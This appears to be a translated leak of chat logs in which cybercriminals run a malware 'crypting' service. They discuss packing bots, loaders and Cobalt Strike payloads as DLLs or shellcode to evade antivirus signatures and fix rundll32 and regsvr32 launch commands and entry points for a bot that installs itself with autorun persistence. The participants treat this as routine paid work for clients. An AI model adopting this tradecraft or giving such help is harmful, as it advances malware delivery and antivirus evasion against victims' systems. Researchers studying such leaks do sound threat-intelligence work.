[27.07.21 18:58:29] manuel: You got stub on 32 eche?
[27.07.21 18:58:41] hugo: Oh, it's been a long time
[27.07.21 18:58:46] hugo: 32 her
[27.07.21 18:59:04] hugo: They die fast, it's impossible to maintain them
[27.07.21 18:59:57] manuel: I understand. Tomorrow I'll strain to order from you crypto uk dll to dll
[27.07.21 19:00:10] hugo: that's how I do everything in exe
[27.07.21 19:00:10] manuel: Ordered
[27.07.21 19:00:19] manuel: only in exe?
[27.07.21 19:00:39] hugo: Yeah, they got hooked on dll
[27.07.21 19:00:47] hugo: And they won't get off that needle
[27.07.21 19:00:49] hugo: )
[27.07.21 19:01:05] manuel: so only kobu ehe 64 can be crypted right?
[27.07.21 19:01:08] hugo: Never had that
[27.07.21 19:01:12] hugo: I don't know.
[27.07.21 19:01:18] hugo: Did we crypt the coba?
[27.07.21 19:01:24] manuel: I think so.
[27.07.21 19:01:25] hugo: Are those the shells?
[27.07.21 19:01:43] manuel: https_444_x64_n1_crypt_x64.ex you did
[27.07.21 19:01:49] hugo: Oh yeah
[27.07.21 19:01:59] manuel: koba has ecce and dll and shellcode
[27.07.21 19:02:02] hugo: You were cooking there everything works fine
[27.07.21 19:02:08] manuel: Yeah, they said okay
[27.07.21 19:02:28] hugo: Maybe, I wasn't interested in its variability
[27.07.21 19:02:46] hugo: Summer, not enough clients?
[27.07.21 19:02:56] manuel: Yes, there are 4-5
[27.07.21 19:03:02] manuel: But mostly dll is coming
[27.07.21 19:03:06] hugo: Everyone went to the sea)
[27.07.21 19:03:17] manuel: sometimes 1-2 times a week they ask me to crypt the coba.
[27.07.21 19:03:23] manuel: I'll order from you
[27.07.21 19:03:56] hugo: Okay.
[27.07.21 19:09:10] manuel: Tell me, can you learn shellcode - in dll and in eche
[27.07.21 19:09:53] hugo: You don't need to master it, you need to write a new cryptor from scratch, and it's a hassle and headache
[27.07.21 19:10:16] hugo: Stop!
[27.07.21 19:10:33] manuel: I just need a shellcode every day
[27.07.21 19:10:39] manuel: 64 and 32
[27.07.21 19:10:39] hugo: Compile Shell as a dll and shove it into cryptor?
[27.07.21 19:10:42] manuel: but mostly 64
[27.07.21 19:10:50] manuel: yes
[27.07.21 19:10:54] hugo: Yeah.
[27.07.21 19:10:59] hugo: You can do that.
[27.07.21 19:11:07] hugo: I compile it by hand
[27.07.21 19:11:58] hugo: I'm relieved, because I already think I'm a lazybones)
[27.07.21 19:12:11] hugo: Every day I sit and silence
[27.07.21 19:12:16] manuel: I'll send you the crypto code tomorrow
[27.07.21 19:12:18] hugo: It's a shame.)

[28.07.21 11:53:30] hugo: Jesus.
[28.07.21 11:53:34] manuel: Is the cryptor even dirty? Will it be possible to crypt the shellcode?
[28.07.21 11:53:42] hugo: Yeah, dirty as shit)
[28.07.21 11:53:54] manuel: I see.
[28.07.21 11:54:15] hugo: I have to keep scanning to find the signature.

[17.09.21 12:04:07] hugo: not an unambiguous answer)
[17.09.21 12:05:09] manuel: because we do cryptos every day and I can't tell exactly when and what flies out. There are times when people complain that it doesn't work after issuing, but that's rare. But in general the life cycle of a crypt is a day. Rarely when it is more.
[17.09.21 12:05:55] manuel: Sometimes they crash right away, then they say who does the mailing too
[17.09.21 12:06:35] hugo: I was wondering how to increase the life span
[17.09.21 12:07:00] manuel: Good idea!)

[17.09.21 12:07:13] hugo: She must be misbehaving

rundll32.exe bot.dll,DllMain --zzzz="test\bp.dat"
DllMain is the entry point,
--zzzz - parameter
"test\bp.dat" - parameter value


When starting the bot as a DLL, I do the following
1) In EntryPoint.
+ store the hModule.
+ start the thread

2) In the thread itself, I do the following
GetModuleFileNameA(g_hModule, LoaderFileName, MAX_PATH);

Thereby LoaderFileName should refer to the bot file. Then I already use this value in another place and make installation - copying, prescribing in the autorun, etc. And the problem is that GetModuleFileNameA returns either an error or LoaderFileName is empty.
---
1) GetModuleFileName(hModule) dll should return real file name on your drive, otherwise you might have problems with installation and updates
2) Crpter should not check file CRC (code sections in particular) or TimeSpamp or Crc from PE header, moni could change during installation.

and the lowader:

and the downloader has no parameters
run with the commands
regsvr32 loader.dll
rundll32 loader.dll,DllRegisterServer
rundll32 loader.dll,DllGetClassObject

where the entry point can be DllRegisterServer or DllGetClassObject

[14.12.21 12:32:38] hugo: But there will be a mistake with the bot, because we start it:
```
rundll32.exe bot.dll,DllMain
```

Rundll32 by default, calls DllMain and the export function.

And to crypt the dll and assign export to DllMain, you need to remove DllMain and assign a new entry point.
Because the export function will overlap with the entry point.

You can assign a new entry point NewDllMain and export DllMain.
As I did with @angelo, but he got an error with the parameters, but the bot worked.

In a nutshell, I need to redo the cryptor to crypt this bot and eventually it will work and there will be an error.

[28.01.22 11:55:04] manuel: Bro, do you remember yesterday we made a dll from tcht? We can try it like this:
[28.01.22 11:55:14] manuel: ``
<volume1> on 2003 all worked but user did not create
[27.01.2022 15:48:51] <volume1> didn't bother them anymore
[27.01.2022 15:48:58] <volume1> not to freeze
[27.01.2022 15:49:13] <volume1> well I tried it on my virtual machine on 7
[27.01.2022 15:49:19] <benalien> Did it work?
[27.01.2022 15:49:22] <volume1> just rundll32.exe name.dll,
[27.01.2022 15:49:24] <volume1> like this
[27.01.2022 15:49:27] <volume1> didn't work
[27.01.2022 15:49:31] <volume1> but added StartW
[27.01.2022 15:49:35] <volume1> it worked
[27.01.2022 15:49:45] <volume1> the exp it doesn't take more parameters
[27.01.2022 15:49:57] <benalien> rundll32 dll.dll,StartW
[27.01.2022 15:50:00] <benalien> Is it like that?
[27.01.2022 15:50:04] <volume1> that works yes
[27.01.2022 15:50:13] <benalien> Got it
[27.01.2022 15:50:48] <volume1> can coder can make by dll principle like metasploit or cobalt there is no need to specify the point and it works out.
[27.01.2022 15:51:12] <volume1> if you take their default dlls
```
[28.01.22 11:55:36] manuel: It worked on 7 and it doesn't work on 2003. Said he had to do it without an entry point
[28.01.22 11:59:27] hugo: So it was made without an entry point
[28.01.22 11:59:53] hugo: DllMain is running RunCmd()
[28.01.22 12:00:26] hugo: And we added symbolic export to run it via rundll32
[28.01.22 12:00:26] manuel: How to run it correctly?
[28.01.22 12:00:26] hugo: DllRegisterServer
[28.01.22 12:00:41] manuel: regsvr32 dll.dll yes?
[28.01.22 12:00:55] hugo: rundll32 dll.dll, DllRegisterServer
[28.01.22 12:01:36] hugo: It's an empty function because DllMain works first, then DllRegisterServer
[28.01.22 12:02:07] hugo: But rundll32 can't run without function, so I added DllRegisterServer
[28.01.22 12:02:32] manuel: Can you do it with a different entry point?
[28.01.22 12:02:39] manuel: Not DllRegisterServer
[28.01.22 12:03:00] hugo: That's not an entry point)
[28.01.22 12:03:18] hugo: ``
__declspec(dllexport) int WINAPIV DllRegisterServer(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow)

[28.01.22 12:03:27] hugo: Empty
[28.01.22 12:03:38] hugo: ``

```
[28.01.22 12:04:25] hugo: rundll32.exe name.dll, it didn't work that way
[28.01.22 12:04:52] hugo: Because rundll32 takes a function parameter
[28.01.22 12:05:08] hugo: rundll32 dll.dll,StartW worked
[28.01.22 12:05:57] hugo: Because first it loads Dllmain and starts the script, and then StartW but there is no such function, but it still works
[28.01.22 12:06:08] hugo: Because the entry point of DllMain
[28.01.22 12:06:20] hugo: Got it?)
[28.01.22 12:06:26] manuel: It's not working on 2003
[28.01.22 12:06:39] manuel: Although, maybe there is different registry and it doesn't work?
[28.01.22 12:06:47] hugo: Maybe
[28.01.22 12:07:00] hugo: I would check the script if I were him.
[28.01.22 12:07:07] hugo: on 2003
[28.01.22 12:07:11] manuel: +++
[28.01.22 12:09:48] hugo: Either a script or a dll
[28.01.22 12:10:09] hugo: It must work higher than Win Vista
[28.01.22 12:15:38] manuel: ``Yes, it works, but the dll
yes it does work but with an entry point. just exp does not accept i think because of that
```
[28.01.22 12:18:52] manuel: ```
<volume1@thesecure.biz> can't do without StartW ?
[15:16:03] <volume1@thesecure.biz> as default for koba for example
